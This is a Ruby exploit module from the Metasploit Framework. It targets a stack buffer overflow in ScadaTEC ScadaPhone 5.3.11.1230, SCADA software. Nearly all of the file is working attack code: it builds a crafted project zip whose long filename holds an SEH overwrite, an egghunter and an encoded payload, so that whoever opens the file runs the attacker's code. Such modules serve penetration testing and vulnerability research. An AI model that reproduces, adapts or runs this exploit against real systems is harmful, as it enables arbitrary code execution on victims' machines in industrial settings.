# $Id: scadaphone_zip.rb 13728 2011-09-13 20:10:28Z swtornio $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
require &#039;rex/zip&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;ScadaTEC ScadaPhone <= v5.3.11.1230 Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow vulnerability in
                version 5.3.11.1230 of scadaTEC&#039;s ScadaPhone.
 
                In order for the command to be executed, an attacker must convince someone to
                load a specially crafted project zip file with ScadaPhone.
                By doing so, an attacker can execute arbitrary code as the victim user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;, # found + msf
                ],
            &#039;Version&#039;        => &#039;$Revision: 13728 $&#039;,
            &#039;References&#039;     =>
                [
                    #[ &#039;CVE&#039;, &#039;&#039; ],
                    [ &#039;OSVDB&#039;, &#039;75375&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.scadatec.com/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17817/&#039; ],
                ],
                &#039;Platform&#039;          => [ &#039;win&#039; ],
                &#039;Payload&#039;           =>
                {
                    &#039;Space&#039;    => 700,
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                    &#039;DisableNops&#039; => true,
                },
            &#039;Targets&#039;        =>
                [
                    # POP ESI; POP EBX; RETN [ScadaPhone.exe]
                    [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x004014F4 } ],
                ],
            &#039;DisclosureDate&#039; => &#039;Sep 12 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The output file name.&#039;, &#039;msf.zip&#039;]),
            ], self.class)
 
    end
 
    def exploit
 
        eggoptions =
        {
            :checksum => false,
            :eggtag => &#039;zipz&#039;
        }
 
        hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
 
        fname = rand_text_alpha_upper(229)
        fname << hunter
        fname << rand_text_alpha_upper(48-hunter.length)
        fname << Rex::Arch::X86.jmp_short(-50)
        fname << rand_text_alpha_upper(2)
        fname << [target.ret].pack(&#039;V&#039;)
        fname << rand_text_alpha_upper(100)
        fname << egg
        fname << rand_text_alpha_upper(4096-fname.length)
        fname << [0x7478741e].pack(&#039;V&#039;)
 
        zip = Rex::Zip::Archive.new
        xtra = [0xdac0ffee].pack(&#039;V&#039;)
        comment = [0xbadc0ded].pack(&#039;V&#039;)
        zip.add_file(fname, xtra, comment)
 
        # Create the file
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file...")
 
        file_create(zip.pack)
    end
 
end



